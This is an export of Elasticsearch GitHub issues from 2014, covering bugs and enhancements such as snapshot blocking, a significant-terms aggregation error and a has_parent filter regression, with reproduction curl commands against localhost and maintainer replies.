<rss><channel><title /><link /><description /><language /><issue end="0" start="0" total="0" /><build-info><version /><build-number /><build-date /></build-info><item><title>wait_for_completion=false waits for snapshot completion</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7952</link><project id="" key="" /><description>Regardless of whether I set `wait_for_completion` to true or false, the call appears to block for the duration of the snapshot creation (20-30s)--though in both cases the snapshot status still shows as IN_PROGRESS right for a second or so after the method returns.

```
client.admin().cluster().prepareCreateSnapshot(repositoryName, snapshotId).setWaitForCompletion(false).get();
```
</description><key id="44599011">7952</key><summary>wait_for_completion=false waits for snapshot completion</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/imotov/following{/other_user}', u'events_url': u'https://api.github.com/users/imotov/events{/privacy}', u'organizations_url': u'https://api.github.com/users/imotov/orgs', u'url': u'https://api.github.com/users/imotov', u'gists_url': u'https://api.github.com/users/imotov/gists{/gist_id}', u'html_url': u'https://github.com/imotov', u'subscriptions_url': u'https://api.github.com/users/imotov/subscriptions', u'avatar_url': u'https://avatars3.githubusercontent.com/u/655851?v=4', u'repos_url': u'https://api.github.com/users/imotov/repos', u'received_events_url': u'https://api.github.com/users/imotov/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/imotov/starred{/owner}{/repo}', u'site_admin': False, u'login': u'imotov', u'type': u'User', u'id': 655851, u'followers_url': u'https://api.github.com/users/imotov/followers'}</assignee><reporter username="">ejain</reporter><labels><label>docs</label></labels><created>2014-10-01T18:30:07Z</created><updated>2014-10-08T12:47:51Z</updated><resolved>2014-10-08T12:46:11Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="imotov" created="2014-10-02T10:41:36Z" id="57611024">As you can see in the [basicWorkFlowTest](https://github.com/elasticsearch/elasticsearch/blob/master/src/test/java/org/elasticsearch/snapshots/SharedClusterSnapshotRestoreTests.java#L115) what you are describing doesn't typically happen. So, could you provide a complete reproduction of your issue? 
</comment><comment author="ejain" created="2014-10-02T18:12:48Z" id="57675835">I hadn't actually tried `setWaitForCompletion(true)`, had assumed that this was the default... The problem remains that leaving out this call (or setting `setWaitForCompletion(false)`) doesn't seem to result in the request returning without blocking. Doesn't look like any of the tests verify this (i.e. ensure that the snapshotting will take at least a few seconds, and check for SnapshotState.IN_PROGRESS).
</comment><comment author="imotov" created="2014-10-03T18:05:44Z" id="57832088">@ejain the default is not to wait for completion. However, it's not well documented. I am going to leave this issue open as a documentation issue. 
</comment><comment author="ejain" created="2014-10-03T19:15:30Z" id="57840807">If the default is to not wait for completion, shouldn't the call return right away, rather than waiting 20-30s?
</comment><comment author="imotov" created="2014-10-03T19:19:10Z" id="57841223">It doesn't return right away because it goes through a series of steps to make sure that snapshot is possible, copies snapshot metadata and sets the snapshot process on individual shards up before returning. It doesn't wait however for shards to finish the snapshot process, which can take very long time.
</comment><comment author="ejain" created="2014-10-07T04:02:08Z" id="58133566">Thanks for the explanation; looks like in my case it's the first part that takes almost all the time (almost 20-30s), and the second part completes in a second or so, hence the confusion.
</comment><comment author="imotov" created="2014-10-08T12:47:51Z" id="58351786">@ejain yes, it can happen if you have a lot of snapshots in the repository and little or no data changes since the last snapshot. 
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Assertion failure when doing a significant terms aggregation.</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7951</link><project id="" key="" /><description>Hello.

I'm running: Version: 1.3.0, Build: 1265b14/2014-07-23T13:46:36Z, JVM: 1.7.0_65

I'm trying to do a simple significant terms aggregation and I get an exception:

Command:

```
curl -s XGET 'localhost:9200/test_index/job/_search?pretty' -d '{
    "query": {
        "filtered": {
            "filter": {
                "terms": {
                    "profession": [
                        "4980"
                    ]
                }
            }
        }
    },
    "size": 0,
    "aggs": {
        "term_cloud": {
            "significant_terms": {
                "field": "fulltext"
            }
        }
    }
}'
```

Response:

```
{
  "error" : "SearchPhaseExecutionException[Failed to execute phase [query], all shards failed; shardFailures {[w_0mi1Z-Tvm68G3dfr7rUg][test_index][2]: ElasticsearchIllegalArgumentException[supersetFreq &gt; supersetSize, in JLHScore.score(..)]}{[w_0mi1Z-Tvm68G3dfr7rUg][test_index][3]: ElasticsearchIllegalArgumentException[supersetFreq &gt; supersetSize, in JLHScore.score(..)]}{[w_0mi1Z-Tvm68G3dfr7rUg][test_index][4]: ElasticsearchIllegalArgumentException[supersetFreq &gt; supersetSize, in JLHScore.score(..)]}{[w_0mi1Z-Tvm68G3dfr7rUg][test_index][0]: ElasticsearchIllegalArgumentException[supersetFreq &gt; supersetSize, in JLHScore.score(..)]}{[w_0mi1Z-Tvm68G3dfr7rUg][test_index][1]: ElasticsearchIllegalArgumentException[supersetFreq &gt; supersetSize, in JLHScore.score(..)]}]",
  "status" : 400
}
```

Console:

```
[2014-10-01 18:02:55,119][DEBUG][action.search.type       ] [Joystick] [test_index][2], node[w_0mi1Z-Tvm68G3dfr7rUg], [P], s[STARTED]: Failed to execute [org.elasticsearch.action.search.SearchRequest@4b58136a]
org.elasticsearch.ElasticsearchIllegalArgumentException: supersetFreq &gt; supersetSize, in JLHScore.score(..)
        at org.elasticsearch.search.aggregations.bucket.significant.heuristics.JLHScore.getScore(JLHScore.java:79)
        at org.elasticsearch.search.aggregations.bucket.significant.InternalSignificantTerms$Bucket.updateScore(InternalSignificantTerms.java:80)
        at org.elasticsearch.search.aggregations.bucket.significant.GlobalOrdinalsSignificantTermsAggregator.buildAggregation(GlobalOrdinalsSignificantTermsAggregator.java:102)
        at org.elasticsearch.search.aggregations.bucket.significant.GlobalOrdinalsSignificantTermsAggregator.buildAggregation(GlobalOrdinalsSignificantTermsAggregator.java:41)
        at org.elasticsearch.search.aggregations.AggregationPhase.execute(AggregationPhase.java:133)
        at org.elasticsearch.search.query.QueryPhase.execute(QueryPhase.java:171)
        at org.elasticsearch.search.SearchService.executeQueryPhase(SearchService.java:261)
        at org.elasticsearch.search.action.SearchServiceTransportAction$5.call(SearchServiceTransportAction.java:206)
        at org.elasticsearch.search.action.SearchServiceTransportAction$5.call(SearchServiceTransportAction.java:203)
        at org.elasticsearch.search.action.SearchServiceTransportAction$23.run(SearchServiceTransportAction.java:517)
        at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
        at java.lang.Thread.run(Thread.java:745)
```

The mapping for the two fields involved:

```
"profession" : {"type" : "integer"},
"fulltext" : {"type" : "string"},
```
</description><key id="44583214">7951</key><summary>Assertion failure when doing a significant terms aggregation.</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/markharwood/following{/other_user}', u'events_url': u'https://api.github.com/users/markharwood/events{/privacy}', u'organizations_url': u'https://api.github.com/users/markharwood/orgs', u'url': u'https://api.github.com/users/markharwood', u'gists_url': u'https://api.github.com/users/markharwood/gists{/gist_id}', u'html_url': u'https://github.com/markharwood', u'subscriptions_url': u'https://api.github.com/users/markharwood/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/170925?v=4', u'repos_url': u'https://api.github.com/users/markharwood/repos', u'received_events_url': u'https://api.github.com/users/markharwood/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/markharwood/starred{/owner}{/repo}', u'site_admin': False, u'login': u'markharwood', u'type': u'User', u'id': 170925, u'followers_url': u'https://api.github.com/users/markharwood/followers'}</assignee><reporter username="">ovidiu</reporter><labels><label>bug</label><label>v1.3.5</label><label>v1.4.0</label><label>v1.5.0</label><label>v2.0.0-beta1</label></labels><created>2014-10-01T16:13:53Z</created><updated>2014-10-03T13:16:38Z</updated><resolved>2014-10-03T12:47:46Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="markharwood" created="2014-10-01T19:10:43Z" id="57518937">Thanks for reporting this I have reproduced the failure and working on the fix
</comment><comment author="markharwood" created="2014-10-01T20:13:15Z" id="57530537">@brwe Wouldn't mind discussing this - one fix for the above is pretty simple (use a background superset doc-count of IndexReader.maxDoc that includes deleted docs) but it introduces a lot of test failures into your SignificantTermsSignificanceScoreTests class which is very sensitive to score changes caused by the randomized testing framework's habit of deleting docs then re-inserting docs.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Only accept unicast pings once started</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7950</link><project id="" key="" /><description>Due to component start order we may process an incoming ping while the ZenDiscovery module is not yet started. This leads to exception (from which we recover correctly, but the logs are note nice). UnicastZenPing should only start processing pings if it is started. We previously processed if not closed or stopped.
</description><key id="44578557">7950</key><summary>Only accept unicast pings once started</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">bleskes</reporter><labels><label>:Discovery</label><label>enhancement</label><label>v1.3.5</label><label>v1.4.0</label><label>v2.0.0-beta1</label></labels><created>2014-10-01T15:39:27Z</created><updated>2015-06-07T11:59:22Z</updated><resolved>2014-10-02T13:02:11Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="s1monw" created="2014-10-01T15:42:52Z" id="57485816">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Suppress long mapping logging during mapping updates (unless in TRACE)</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7949</link><project id="" key="" /><description>Currently DEBUG logs can get very verbose because IndicesClusterStateService logs the complete mapping with every mapping update. We should suppress it if long in DEBUG mode and always log the full one in TRACE.
</description><key id="44568297">7949</key><summary>Suppress long mapping logging during mapping updates (unless in TRACE)</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">bleskes</reporter><labels><label>:Logging</label><label>enhancement</label><label>v1.5.0</label><label>v2.0.0-beta1</label></labels><created>2014-10-01T14:17:11Z</created><updated>2015-06-07T10:49:20Z</updated><resolved>2014-10-02T20:21:51Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="s1monw" created="2014-10-02T20:17:56Z" id="57698408">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Fix order for PUT _mapping URL in docs</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7948</link><project id="" key="" /><description>Remove backwards compatibility message.

@clintongormley Anything you want to update?

See a old order for _mapping here as well, should I update it?

https://github.com/elasticsearch/elasticsearch/blob/master/docs/reference/search/suggesters/context-suggest.asciidoc
</description><key id="44561889">7948</key><summary>Fix order for PUT _mapping URL in docs</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/clintongormley/following{/other_user}', u'events_url': u'https://api.github.com/users/clintongormley/events{/privacy}', u'organizations_url': u'https://api.github.com/users/clintongormley/orgs', u'url': u'https://api.github.com/users/clintongormley', u'gists_url': u'https://api.github.com/users/clintongormley/gists{/gist_id}', u'html_url': u'https://github.com/clintongormley', u'subscriptions_url': u'https://api.github.com/users/clintongormley/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/56599?v=4', u'repos_url': u'https://api.github.com/users/clintongormley/repos', u'received_events_url': u'https://api.github.com/users/clintongormley/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/clintongormley/starred{/owner}{/repo}', u'site_admin': False, u'login': u'clintongormley', u'type': u'User', u'id': 56599, u'followers_url': u'https://api.github.com/users/clintongormley/followers'}</assignee><reporter username="">phungleson</reporter><labels><label>docs</label></labels><created>2014-10-01T13:17:38Z</created><updated>2014-10-14T19:54:25Z</updated><resolved>2014-10-14T19:54:20Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="phungleson" created="2014-10-01T13:20:36Z" id="57461523">And here as well.

https://github.com/elasticsearch/elasticsearch/blob/master/docs/reference/mapping/dynamic-mapping.asciidoc

That's probably all since I searched the whole repo.
</comment><comment author="clintongormley" created="2014-10-14T14:03:10Z" id="59049147">Hi @phungleson 

Sorry for the delay. This PR looks good. Yes if you could update the PR to include those other two files, it would be greatly appreciated.  Thanks for looking at this.
</comment><comment author="phungleson" created="2014-10-14T19:54:20Z" id="59105846">Hmm seems like I made a mistake. I cherry-picked to this instead #8083 
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Add log4j-extras dependency</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7947</link><project id="" key="" /><description>To enable log compression and automatic deletion after a set period.

Closes #7927
</description><key id="44546830">7947</key><summary>Add log4j-extras dependency</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/colings86/following{/other_user}', u'events_url': u'https://api.github.com/users/colings86/events{/privacy}', u'organizations_url': u'https://api.github.com/users/colings86/orgs', u'url': u'https://api.github.com/users/colings86', u'gists_url': u'https://api.github.com/users/colings86/gists{/gist_id}', u'html_url': u'https://github.com/colings86', u'subscriptions_url': u'https://api.github.com/users/colings86/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/236731?v=4', u'repos_url': u'https://api.github.com/users/colings86/repos', u'received_events_url': u'https://api.github.com/users/colings86/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/colings86/starred{/owner}{/repo}', u'site_admin': False, u'login': u'colings86', u'type': u'User', u'id': 236731, u'followers_url': u'https://api.github.com/users/colings86/followers'}</assignee><reporter username="">philmcmahon</reporter><labels><label>:Logging</label><label>enhancement</label><label>v1.5.0</label><label>v2.0.0-beta1</label></labels><created>2014-10-01T09:57:40Z</created><updated>2015-03-19T09:38:35Z</updated><resolved>2014-11-13T12:46:59Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="colings86" created="2014-11-07T13:59:18Z" id="62147977">@philmcmahon thanks for the PR, and for updating it so fast. It's looking pretty good, I'll try to get this merged in soon.
</comment><comment author="colings86" created="2014-11-13T10:17:25Z" id="62869507">@philmcmahon I had to make a few changes to the packaging to make sure the jar gets added to our releases properly. I have opened a new PR https://github.com/elasticsearch/elasticsearch/pull/8464 for this, but the commit still has you as the author.  Hope thats ok.
</comment><comment author="colings86" created="2014-11-13T12:46:59Z" id="62885225">@philmcmahon I have merged your change into master and 1.x branches in #8464 so it should be available from 1.5 onwards. Thanks again for the PR.
</comment><comment author="philmcmahon" created="2014-11-13T14:38:15Z" id="62898818">@colings86 Brilliant, thanks!
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Packaging: Unify behaviour of executables in bin/</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7946</link><project id="" key="" /><description>Right now the `bin/plugin` and `bin/elasticsearch` commands are treated very differently, which is not a problem unless the executables are packaged and moved outside the `bin/` folder of the distribution or the configuration files are moved somewhere else like into `/etc/elasticsearch/`

I propose a couple of changes to make it possible to execute `bin/plugin` without additional parameters, even in packaged environments.
- `bin/plugin` and `bin/elasticsearch` should try to parse the distribution configuration files like `/etc/default/elasticsearch` and `/etc/sysconfig/elasticsearch` - so that these can be used to configure the configuration directory. This also requires changes in those files, to make sure these are setting defaults instead of the init scripts like done in the debian script
- both should support `ES_JAVA_OPTS` (right now only `bin/elasticsearch` does)
- both should support the `--path.home` notation for setting properties, which might be needed to execute (right now only `bin/elasticsearch` does)
</description><key id="44541388">7946</key><summary>Packaging: Unify behaviour of executables in bin/</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/tlrx/following{/other_user}', u'events_url': u'https://api.github.com/users/tlrx/events{/privacy}', u'organizations_url': u'https://api.github.com/users/tlrx/orgs', u'url': u'https://api.github.com/users/tlrx', u'gists_url': u'https://api.github.com/users/tlrx/gists{/gist_id}', u'html_url': u'https://github.com/tlrx', u'subscriptions_url': u'https://api.github.com/users/tlrx/subscriptions', u'avatar_url': u'https://avatars1.githubusercontent.com/u/642733?v=4', u'repos_url': u'https://api.github.com/users/tlrx/repos', u'received_events_url': u'https://api.github.com/users/tlrx/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/tlrx/starred{/owner}{/repo}', u'site_admin': False, u'login': u'tlrx', u'type': u'User', u'id': 642733, u'followers_url': u'https://api.github.com/users/tlrx/followers'}</assignee><reporter username="">spinscale</reporter><labels><label>:Packaging</label></labels><created>2014-10-01T08:53:19Z</created><updated>2015-08-16T10:47:55Z</updated><resolved>2015-08-16T10:47:55Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2015-08-16T10:47:55Z" id="131523408">This has been resolved in other tickets
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Be stricter parsing ids for ids query</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7945</link><project id="" key="" /><description>Adds a check to make sure that all ids in the query are either strings
or numbers. This is to prevent the case where a user accidentally
specifies:

"ids": [["1", "2"]]

(note the double array)

With this change, an exception will be thrown since the second "[" is
not a string or number, it is a Token.START_ARRAY.

Fixes #7686
</description><key id="44539809">7945</key><summary>Be stricter parsing ids for ids query</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">dakrone</reporter><labels><label>:Query DSL</label><label>enhancement</label><label>v1.5.0</label><label>v2.0.0-beta1</label></labels><created>2014-10-01T08:32:36Z</created><updated>2015-03-19T09:38:58Z</updated><resolved>2014-10-01T08:35:27Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="s1monw" created="2014-10-01T08:33:38Z" id="57434080">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Highlighting - snippets too long for phrase queries on fields using english analyzer</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7944</link><project id="" key="" /><description>I've found an issue which is very similar to https://github.com/elasticsearch/elasticsearch/issues/4605 (which I can confirm is fixed in Elasticsearch 1.3.4).

If I set the field to use the english analyzer the snippet is far longer than it should be when using a phrase with a query_string query. 

I've modified the test case from #4605 here: https://gist.github.com/jurgc11/139b6ae8a177dfd8a2f2.
</description><key id="44537460">7944</key><summary>Highlighting - snippets too long for phrase queries on fields using english analyzer</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">jurgc11</reporter><labels><label>:Highlighting</label></labels><created>2014-10-01T07:59:23Z</created><updated>2016-11-25T16:38:03Z</updated><resolved>2016-11-25T16:38:03Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="nik9000" created="2014-10-07T20:15:11Z" id="58253183">I'd try another highlighter.  The fast vector highlighter or the [experimental highlighter plugin](https://github.com/wikimedia/search-highlighter) are much more likely to do it right.  Highlighters in general are pretty darn finicky unfortunately.
</comment><comment author="lukhnos" created="2015-12-29T02:53:37Z" id="167704115">I ran into the same issue with ElasticSearch 1.5. There is a recently reopened Lucene bug ([LUCENE-2229](https://issues.apache.org/jira/browse/LUCENE-2229)) that should be the root cause &#8211;&#160;a boundary condition in `SimpleSpanFragmenter`. Since the setup above [requires `SimpleSpanFragmenter` to be used](https://github.com/elastic/elasticsearch/blob/c6182cbd3799c9ea25cf0716be541e01f101b025/core/src/main/java/org/elasticsearch/search/highlight/PlainHighlighter.java#L81) and since `PlainHighlighter` in master still hits the same code path, I believe the bug still manifests itself in the latest version of ElasticSearch.
</comment><comment author="clintongormley" created="2016-11-24T18:53:36Z" id="262831953">This appears to be fixed in 5.0</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Filtered query containing has_parent filter ignores nested not filter </title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7943</link><project id="" key="" /><description>I've just upgraded from 1.3.0 to 1.3.3 and I'm finding that a filtered query containing a has_parent filter with a nested not filter is no longer returning the data I expect.

In my particular scenario the ElasticSearch repository contains a child record whose parent has a field "addrNo" with the value "60".  When I run the following query that particular record is returned (which is not what I expected):

```
{
  "query": {
    "filtered": {
      "query": {
        "match_all": {}
      },
      "filter": {
        "has_parent": {
          "filter": {
            "not": {
              "filter": {
                "fquery": {
                  "query": {
                    "match": {
                      "addrNo": {
                        "query": "60",
                        "type": "boolean"
                      }
                    }
                  },
                  "_cache": true
                }
              }
            }
          },
          "parent_type": "testAddress"
        }
      }
    }
  }
}
```

If you want me to provide a cutdown example please let me know.

Edit: Improved query layout.
</description><key id="44532301">7943</key><summary>Filtered query containing has_parent filter ignores nested not filter </summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/martijnvg/following{/other_user}', u'events_url': u'https://api.github.com/users/martijnvg/events{/privacy}', u'organizations_url': u'https://api.github.com/users/martijnvg/orgs', u'url': u'https://api.github.com/users/martijnvg', u'gists_url': u'https://api.github.com/users/martijnvg/gists{/gist_id}', u'html_url': u'https://github.com/martijnvg', u'subscriptions_url': u'https://api.github.com/users/martijnvg/subscriptions', u'avatar_url': u'https://avatars3.githubusercontent.com/u/580421?v=4', u'repos_url': u'https://api.github.com/users/martijnvg/repos', u'received_events_url': u'https://api.github.com/users/martijnvg/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/martijnvg/starred{/owner}{/repo}', u'site_admin': False, u'login': u'martijnvg', u'type': u'User', u'id': 580421, u'followers_url': u'https://api.github.com/users/martijnvg/followers'}</assignee><reporter username="">davidmichell</reporter><labels /><created>2014-10-01T06:27:01Z</created><updated>2014-10-08T21:42:26Z</updated><resolved>2014-10-08T14:52:53Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="selera" created="2014-10-07T01:55:01Z" id="58126412">Would be great to see a fix for this.
</comment><comment author="martijnvg" created="2014-10-07T08:07:34Z" id="58150323">@davidmichell Can you provide an example that illustrates what you expect and what is returned?
</comment><comment author="davidmichell" created="2014-10-07T21:25:02Z" id="58265213">Certainly, will do.
</comment><comment author="davidmichell" created="2014-10-08T01:31:16Z" id="58292115">@martijnvg Here is a small test scenario that illustrates the problem:

```
// Create ES mapping
curl -XPOST localhost:9200/test1 -d '
{
 "mappings": {
  "a" : {
   "properties" : {
    "a1" : {
     "type" : "string"
    }
   }
  },
  "b" : {
   "_parent" : {
    "type" : "a"
   },
   "properties" : {
    "b1" : {
     "type" : "string"
    }
   }
  }
 }
}
'

// Populate ES with data
curl -XPUT localhost:9200/test1/a/1 -d '
{
 "a1" : "testa1"
}
'
curl -XPUT localhost:9200/test1/b/1?parent=1 -d '
{
 "b1" : "testb1"
}
'

// Query (showing record returned when it shouldn't be)
curl -XGET localhost:9200/test1/b/_search -d '
{
  "query": {
    "filtered": {
      "query": {
        "match_all": {}
      },
      "filter": {
        "has_parent": {
          "filter": {
            "not": {
              "filter": {
                "fquery": {
                  "query": {
                    "match": {
                      "a1": {
                        "query": "testa1",
                        "type": "boolean"
                      }
                    }
                  },
                  "_cache": true
                }
              }
            }
          },
          "parent_type": "a"
        }
      }
    }
  }
}
'
//Response
{"took":84,"timed_out":false,"_shards":{"total":1,"successful":1,"failed":0},"hits":{"total":1,"max_score":1.0,"hits":[{"_index":"test1","_type":"b","_id":"1","_score":1.0,"_source":{ "b1" : "testb1"}}]}}
```

The query returned a hit but I was expecting it to return no hits.

Running this test using ElasticSearch 1.3.2 returns no hits (i.e. it works as expected).
</comment><comment author="martijnvg" created="2014-10-08T10:48:51Z" id="58340390">@davidmichell This is a bug introduced by this change: https://github.com/elasticsearch/elasticsearch/pull/7362

I'll fix create a fix for this soon.
</comment><comment author="martijnvg" created="2014-10-08T14:54:29Z" id="58370453">@davidmichell Thanks for reporting, I pushed a fix for this bug, which will be included in the next release.

What you can do in the meantime to get around the bug is to use the `has_parent` query instead of the `has_parent` filter, since the query doesn't contain this bug.
</comment><comment author="davidmichell" created="2014-10-08T21:04:18Z" id="58427392">Thanks very much.
</comment><comment author="selera" created="2014-10-08T21:42:26Z" id="58432695">Thanks Martin, for the quick fix and workaround.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>filter '_index' same way as '_type' in search across multiple index query.</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7942</link><project id="" key="" /><description>cannot filter '_index' in filters query.

I have two indexes index1 and index2 and both has two types type1 and type2 with same name in elastic search.(please assume that we have valid business reason behind it)

I would like to search index1 - type1 and index2 -type2

here is my Sense query.

POST _search
{
 "query": {
    "indices": {
      "indices": ["index1","index2"],  
      "query": {
        "filtered":{  
         "query":{
       "multi_match": {
           "query": "test",
           "type": "cross_fields",
           "fields": ["_all"]  
       }

```
    },
     "filter":{  
        "or":{  
           "filters":[  
              {  
                 "terms":{ 
                            "_index":["index1"], // how can i make this work?
                           "_type": ["type1"]
                 }                      
              },
              {  
                 "terms":{ 
                           "_index":["index2"], // how can i make this work?
                           "_type": ["type2"]
                 }                      
              }
           ]
        }
     }
  }
  },
  "no_match_query":"none"
}
```

  }
 }
</description><key id="44523628">7942</key><summary>filter '_index' same way as '_type' in search across multiple index query.</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">vijayshiyani</reporter><labels /><created>2014-10-01T03:00:37Z</created><updated>2014-10-01T15:41:33Z</updated><resolved>2014-10-01T15:41:33Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="imotov" created="2014-10-01T15:41:21Z" id="57485423">@vijayshiyani we are trying to use github for bug reports and feature requests. The best place to ask questions like this is our [mailing list](https://groups.google.com/a/elasticsearch.com/forum/#!myforums). Saying that, take a look at [indices filter](http://www.elasticsearch.org/guide/en/elasticsearch/reference/current/query-dsl-indices-filter.html), I think this is what you are looking for.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Snapshots locked up after aborting very large snapshot</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7941</link><project id="" key="" /><description>Running 1.3.2. Have a snapshot repository using my swift plugin. The snapshot plugin has worked for us before on smaller subsets of indexes. I attempted a rather large snapshot of all our currently running indexes (about 1700 or so) with the usual:

``` bash
curl -s -XPUT localhost:9200/_snapshots/backups/cirrus-initial-all?wait_for_completion=false -d '{
  "ignore_unavailable": "true",
  "include_global_state": false
}'
```

Waited for a bit, not a lot seemed to be happening. Querying the snapshot showed it as IN_PROGRESS. I didn't see any data getting written to Swift though. I Ctrl+C'd out of the snapshot and now all of /_snapshots/backups/ seems hung up from GET requests. Can't seem to get a DELETE on the snapshot to go through, and the nuclear option of issuing a DELETE on the whole repository returned a message about it being in use. ES error logs contain nothing relevant that I see.
</description><key id="44504768">7941</key><summary>Snapshots locked up after aborting very large snapshot</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/imotov/following{/other_user}', u'events_url': u'https://api.github.com/users/imotov/events{/privacy}', u'organizations_url': u'https://api.github.com/users/imotov/orgs', u'url': u'https://api.github.com/users/imotov', u'gists_url': u'https://api.github.com/users/imotov/gists{/gist_id}', u'html_url': u'https://github.com/imotov', u'subscriptions_url': u'https://api.github.com/users/imotov/subscriptions', u'avatar_url': u'https://avatars3.githubusercontent.com/u/655851?v=4', u'repos_url': u'https://api.github.com/users/imotov/repos', u'received_events_url': u'https://api.github.com/users/imotov/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/imotov/starred{/owner}{/repo}', u'site_admin': False, u'login': u'imotov', u'type': u'User', u'id': 655851, u'followers_url': u'https://api.github.com/users/imotov/followers'}</assignee><reporter username="">demon</reporter><labels /><created>2014-09-30T21:54:51Z</created><updated>2014-10-03T18:18:51Z</updated><resolved>2014-10-03T18:18:51Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="demon" created="2014-09-30T22:04:45Z" id="57390548">#7859 seems similar.
</comment><comment author="imotov" created="2014-10-01T15:59:34Z" id="57488996">@demon what do you mean by "Ctrl-C'd" our of the snapshot"?
</comment><comment author="demon" created="2014-10-03T16:26:48Z" id="57819454">The original PUT had not returned to my terminal, so I quit the process.
</comment><comment author="demon" created="2014-10-03T16:46:55Z" id="57821960">Looked into a bit further, turns out there was a zombie indexing process that wasn't doing anything anymore. I restarted ES on that node and I seem to be able to perform actions on the repo again.
</comment><comment author="imotov" created="2014-10-03T17:04:01Z" id="57824098">Zombie indexing process? Did you captures a stack trace by any chance?
</comment><comment author="demon" created="2014-10-03T18:00:22Z" id="57831383">I wasn't able to get a stack trace I'm afraid :\
</comment><comment author="imotov" created="2014-10-03T18:18:45Z" id="57833707">If it will happen again, please run jstack on the java process before killing it. Closing this issue for now.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>[TEST] Make mlt rest tests pass on a single node cluster</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7940</link><project id="" key="" /><description>`wait_on_status: green` otherwise times out and we need to wait for green (and not just yellow) to make sure mappings are propagated.
